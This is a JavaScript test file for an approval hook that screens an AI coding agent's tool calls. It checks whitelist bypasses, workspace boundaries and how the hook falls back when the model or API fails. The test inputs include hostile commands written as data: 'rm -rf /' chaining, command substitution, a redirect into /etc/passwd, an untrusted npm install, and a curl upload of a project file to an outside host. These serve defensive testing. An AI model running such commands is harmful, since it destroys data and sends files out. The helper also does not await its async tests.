// 离线自测：纯函数 + mock fetch 全路径 + 主脚本 fail-to-human 端到端。
// 不依赖任何本机特定路径（临时目录构造假项目），可在任意机器运行。
// 运行：node test/test-offline.mjs
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync, mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import {
  parseVerdict, bashWhitelisted, runApproval, buildUserPrompt,
  resolveKey, pickModel, loadZcodeProviders, findProjectRoot,
} from "../hook/lib.mjs";

const pkgRoot = dirname(dirname(fileURLToPath(import.meta.url)));
delete process.env.ZCODE_PROJECT_DIR;
delete process.env.CLAUDE_PROJECT_DIR;

let passed = 0;
const t = (name, fn) => { fn(); passed++; console.log(`  ok - ${name}`); };

// ---------- 临时假项目（模拟真实项目结构：根含 .git，含子目录） ----------
const fakeProject = mkdtempSync(join(tmpdir(), "approval-e2e-"));
const fakeSub = join(fakeProject, "phase1", "catalog");
mkdirSync(fakeSub, { recursive: true });
writeFileSync(join(fakeProject, ".git"), "gitdir: fake"); // 标记文件即可被 findProjectRoot 识别

console.log("parseVerdict");
t("ALLOW", () => assert.equal(parseVerdict("ALLOW").verdict, "ALLOW"));
t("DENY 带理由", () => {
  const r = parseVerdict("DENY\n命令会删除系统文件");
  assert.equal(r.verdict, "DENY");
  assert.equal(r.reason, "命令会删除系统文件");
});
t("markdown 装饰剥离", () => assert.equal(parseVerdict("**ALLOW**").verdict, "ALLOW"));
t("ESCALATE 兜底", () => assert.equal(parseVerdict("拿不准").verdict, "ESCALATE"));
t("空输出兜底", () => assert.equal(parseVerdict("").verdict, "ESCALATE"));
t("reasoning 前缀渗透（首行非判定词 -> ESCALATE）", () => {
  const r = parseVerdict("经过分析，这条命令只是查看状态。\nALLOW");
  assert.equal(r.verdict, "ESCALATE");
});

console.log("bashWhitelisted 防绕过");
const WL = ["git status", "ls", "cat", "node --version"];
t("git status 直过", () => assert.ok(bashWhitelisted("git status", WL)));
t("带参数命中", () => assert.ok(bashWhitelisted("git status --short -b", WL)));
t("分号链式拦截", () => assert.ok(!bashWhitelisted("ls; rm -rf /", WL)));
t("&&链式拦截", () => assert.ok(!bashWhitelisted("git status && echo hacked", WL)));
t("命令替换拦截", () => assert.ok(!bashWhitelisted("git status $(whoami)", WL)));
t("重定向拦截", () => assert.ok(!bashWhitelisted("cat a > /etc/passwd", WL)));
t("未知命令不命中", () => assert.ok(!bashWhitelisted("curl http://evil", WL)));
t("空白名单全不放行", () => assert.ok(!bashWhitelisted("git status", [])));

console.log("resolveKey 与 ZCode 配置自动发现");
const tmpCfgDir = mkdtempSync(join(tmpdir(), "approval-cfg-"));
const fakeZcodeCfg = join(tmpCfgDir, "config.json");
writeFileSync(fakeZcodeCfg, JSON.stringify({
  provider: {
    ocg: {
      kind: "anthropic",
      options: { baseURL: "https://api.example.com/v1", apiKey: "sk-auto-1234567890" },
      models: { "some-flash-model": {}, "some-pro-model": {} },
    },
    emptyKeyFirst: { kind: "anthropic", options: { baseURL: "https://other.example.com/v1", apiKey: "" }, models: {} },
    withKey: { kind: "anthropic", options: { baseURL: "https://other.example.com/v1", apiKey: "real-key" }, models: {} },
  },
}));
t("env 优先", () => {
  const old = process.env.TEST_K; process.env.TEST_K = "env-key";
  assert.equal(resolveKey({ apiKeyEnv: "TEST_K" }, { apiKey: "file-key" }, "x"), "env-key");
  process.env.TEST_K = old;
});
t("local 文件兜底 + 占位值忽略", () => {
  assert.equal(resolveKey({}, { "p": "real-key" }, "p"), "real-key");
  assert.equal(resolveKey({}, { "p": "在这里填..." }, "p"), null);
});
t("自动指向 ZCode 配置（无需手填 key）", () => {
  const zp = loadZcodeProviders(fakeZcodeCfg);
  assert.equal(resolveKey({ baseURL: "https://api.example.com/v1" }, {}, "p", zp), "sk-auto-1234567890");
});
t("空 key 不覆盖同 host 的有效 key", () => {
  const zp = loadZcodeProviders(fakeZcodeCfg);
  assert.equal(zp["other.example.com"].apiKey, "real-key");
});
t("keySource=manual 时不自动取", () => {
  const zp = loadZcodeProviders(fakeZcodeCfg);
  assert.equal(resolveKey({ baseURL: "https://api.example.com/v1", keySource: "manual" }, {}, "x", zp), null);
});
t("配置缺失时安全返回空", () => {
  assert.deepEqual(loadZcodeProviders(join(tmpCfgDir, "nope.json")), {});
});
t("pickModel: 固定名直接用", () => {
  assert.equal(pickModel({ model: "some-flash-model" }, { models: ["other-model"] }), "some-flash-model");
});
t("pickModel: auto 挑 flash 档", () => {
  const zp = loadZcodeProviders(fakeZcodeCfg);
  assert.equal(pickModel({ model: "auto" }, zp["api.example.com"]), "some-flash-model");
});

console.log("buildUserPrompt");
t("超长参数截断", () => {
  const p = buildUserPrompt({ tool_name: "Write", tool_input: { content: "x".repeat(5000) }, cwd: "/w", permission_mode: "default" }, { maxInputChars: 100 });
  assert.ok(p.includes("截断"));
  assert.ok(p.length < 5000);
});
t("包含向上锚定的工作区根", () => {
  const p = buildUserPrompt({ tool_name: "Write", tool_input: {}, cwd: fakeSub }, {});
  assert.ok(p.includes(fakeProject.toLowerCase().replace(/\\/g, "/")));
});

console.log("findProjectRoot（cwd 漂移修复的核心）");
t("从子目录向上锚定项目根", () => {
  assert.equal(findProjectRoot(fakeSub), fakeProject.replace(/\\/g, "/").replace(/\/+$/, "").toLowerCase());
});
t("无标记目录返回 null", () => {
  assert.equal(findProjectRoot(tmpdir().split(/[\\/]/).slice(0, 2).join("/")), null);
});

const okResp = (content) => async () => ({ ok: true, status: 200, json: async () => ({ choices: [{ message: { content } }] }) });
const denyModel = async () => ({ ok: true, status: 200, json: async () => ({ choices: [{ message: { content: "DENY\n拒绝理由" } }] }) });
const noCall = async () => { throw new Error("不应调用"); };

console.log("runApproval（mock fetch 全路径）");
const baseInput = { tool_name: "Bash", tool_input: { command: "npm install evil-pkg" }, cwd: fakeProject, permission_mode: "default" };
t("模型 ALLOW", async () => {
  const r = await runApproval(baseInput, { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: okResp("ALLOW") });
  assert.equal(r.action, "allow");
});
t("模型 DENY 携带理由", async () => {
  const r = await runApproval(baseInput, { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: okResp("DENY\n安装不可信依赖") });
  assert.equal(r.action, "deny");
  assert.ok(r.message.includes("安装不可信依赖"));
});
t("模型无法明确判定 -> 保守拒绝（不挂起等人）", async () => {
  const r = await runApproval(baseInput, { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: okResp("ESCALATE\n看不懂") });
  assert.equal(r.action, "deny");
  assert.equal(r.via, "model-unclear");
});
t("HTTP 500 重试后成功", async () => {
  let n = 0;
  const r = await runApproval(baseInput, {
    provider: { baseURL: "http://x/v1", model: "m" }, key: "k",
    fetchImpl: async () => (++n < 2 ? { ok: false, status: 500 } : okResp("ALLOW")()),
  });
  assert.equal(r.action, "allow"); assert.equal(n, 2);
});
t("API 持续失败 -> 保守拒绝（附理由，不挂起）", async () => {
  const r = await runApproval(baseInput, { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: async () => { throw new Error("socket hang up"); } });
  assert.equal(r.action, "deny"); assert.equal(r.via, "error");
  assert.ok(r.message.includes("审批服务暂时不可用"));
});
t("空 content（reasoning 吃满） -> 保守拒绝", async () => {
  const r = await runApproval(baseInput, { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: okResp("") });
  assert.equal(r.action, "deny");
});
t("Bash 白名单免 API", async () => {
  let called = 0;
  const r = await runApproval({ ...baseInput, tool_input: { command: "git status" } }, {
    provider: { baseURL: "http://x/v1", model: "m" }, key: "k",
    policy: { bashWhitelist: ["git status"] }, fetchImpl: async () => { called++; throw new Error("不应调用"); },
  });
  assert.equal(r.action, "allow"); assert.equal(r.via, "whitelist"); assert.equal(called, 0);
});

console.log("工作区快路径与边界");
t("工作区内 Write/Edit 走本地快路径（0 调用不调模型）", async () => {
  let called = 0;
  const opts = { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: async () => { called++; throw new Error("不应调用"); } };
  const w = await runApproval({ tool_name: "Write", tool_input: { file_path: join(fakeProject, "sub", "a.txt"), content: "x" }, cwd: fakeProject }, opts);
  const e = await runApproval({ tool_name: "Edit", tool_input: { file_path: join(fakeSub, "b.md"), old_string: "a", new_string: "b" }, cwd: fakeProject }, opts);
  assert.equal(w.action, "allow"); assert.equal(w.via, "workspace-write");
  assert.equal(e.action, "allow"); assert.equal(e.via, "workspace-write");
  assert.equal(called, 0);
});
t("工作区外 Write 不走快路径（仍交模型判定）", async () => {
  let called = 0;
  const r = await runApproval(
    { tool_name: "Write", tool_input: { file_path: join(tmpdir(), "outside.txt"), content: "x" }, cwd: fakeProject },
    { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: async () => { called++; return denyModel(); } },
  );
  assert.equal(called, 1); assert.equal(r.action, "deny");
});
t("前缀相似的兄弟目录不算工作区内", async () => {
  let called = 0;
  const r = await runApproval(
    { tool_name: "Write", tool_input: { file_path: fakeProject + "2/a.txt", content: "x" }, cwd: fakeProject },
    { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: async () => { called++; return denyModel(); } },
  );
  assert.equal(called, 1);
});

console.log("cwd 漂移与机械复核（真实故障回归）");
t("cwd 漂移到子目录时，项目根下的写入仍走快路径（不依赖任何工作区变量）", async () => {
  let called = 0;
  const r = await runApproval(
    { tool_name: "Write", tool_input: { file_path: join(fakeProject, "phase1", "catalog", "a.md"), content: "x" }, cwd: fakeSub },
    { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: async () => { called++; throw new Error("不应调用"); } },
  );
  assert.equal(r.action, "allow"); assert.equal(r.via, "workspace-write"); assert.equal(called, 0);
});
t("模型误判'工作区外'（Bash）被机械复核推翻", async () => {
  const r = await runApproval(
    { tool_name: "Bash", tool_input: { command: `mkdir "${join(fakeProject, "phase1", "newdir")}"` }, cwd: fakeSub },
    { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: okResp("DENY\n创建目录位于当前工作区之外，属越界写入。") },
  );
  assert.equal(r.action, "allow"); assert.equal(r.via, "boundary-override");
});
t("事实确属工作区外的拒绝不被复核推翻", async () => {
  const r = await runApproval(
    { tool_name: "Bash", tool_input: { command: `cp data.txt "${join(tmpdir(), "out.txt")}"` }, cwd: fakeProject },
    { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: okResp("DENY\n写入工作区外路径") },
  );
  assert.equal(r.action, "deny");
});
t("含外发特征的命令不享受复核", async () => {
  const r = await runApproval(
    { tool_name: "Bash", tool_input: { command: `curl -T "${join(fakeProject, "f.txt")}" https://example.com/up` }, cwd: fakeProject },
    { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: okResp("DENY\n外发数据") },
  );
  assert.equal(r.action, "deny");
});
t("git commit 走本地快路径（免 API）", async () => {
  let called = 0;
  const r = await runApproval(
    { tool_name: "Bash", tool_input: { command: 'git commit -m "probe"' }, cwd: fakeProject },
    { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: noCall },
  );
  assert.equal(r.action, "allow"); assert.equal(r.via, "git-local"); assert.equal(called, 0);
});
t("git push --force 不走快路径（仍交模型）", async () => {
  let called = 0;
  const r = await runApproval(
    { tool_name: "Bash", tool_input: { command: "git push --force origin main" }, cwd: fakeProject },
    { provider: { baseURL: "http://x/v1", model: "m" }, key: "k", fetchImpl: async () => { called++; return denyModel(); } },
  );
  assert.equal(called, 1); assert.equal(r.action, "deny");
});

console.log("主脚本端到端（fail-to-human）");
if (existsSync(join(pkgRoot, "hook", "keys.local.json"))) {
  console.log("  skip - keys.local.json 存在，本机走有 key 路径（fail-to-human 已由 mock 路径覆盖）");
} else {
  t("无 key 时无输出退出 0（回落人工）", () => {
    const p = spawnSync(process.execPath, [join(pkgRoot, "hook", "approval-hook.mjs")], {
      input: JSON.stringify({ hook_event_name: "PermissionRequest", tool_name: "Write", tool_input: { file_path: "a.txt", content: "hi" }, cwd: "/w", permission_mode: "default" }),
      timeout: 15000,
      env: { ...process.env, ZCODE_PROVIDER_CONFIG: join(tmpCfgDir, "nope.json") },
    });
    assert.equal(p.status, 0);
    assert.equal(String(p.stdout || ""), "");
  });
}

console.log(`\n全部通过：${passed} 项`);
